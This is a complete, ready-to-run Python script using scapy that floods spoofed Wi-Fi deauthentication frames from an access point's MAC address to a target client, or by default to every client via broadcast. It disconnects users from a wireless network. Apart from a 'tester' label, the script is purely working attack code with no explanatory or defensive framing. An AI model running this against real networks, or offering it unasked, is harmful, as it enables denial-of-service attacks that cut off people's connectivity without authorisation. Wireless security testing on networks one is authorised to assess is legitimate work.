#!/usr/bin/env python3
import argparse
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

def send_deauth(iface, target_mac, ap_mac, count, interval):
    """
    Send `count` deauth frames from AP to target (or broadcast if target_mac is ff:ff:...).
    """
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    print(f"[+] Sending {count} deauth frames from AP {ap_mac} to target {target_mac} on {iface}")
    for i in range(count):
        sendp(packet, iface=iface, verbose=False)
        time.sleep(interval)
    print("[+] Done.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Deauth flood tester")
    parser.add_argument("-i", "--iface", required=True,
                        help="Monitor‑mode interface (e.g., wlan0mon)")
    parser.add_argument("-a", "--ap", required=True,
                        help="MAC address of the Access Point (source)")
    parser.add_argument("-t", "--target", default="ff:ff:ff:ff:ff:ff",
                        help="Target client MAC (default: broadcast)")
    parser.add_argument("-c", "--count", type=int, default=100,
                        help="Number of deauth frames to send")
    parser.add_argument("-r", "--rate", type=float, default=0.01,
                        help="Interval between frames in seconds (default 0.01s)")

    args = parser.parse_args()

    send_deauth(
        iface=args.iface,
        target_mac=args.target.lower(),
        ap_mac=args.ap.lower(),
        count=args.count,
        interval=args.rate
    )
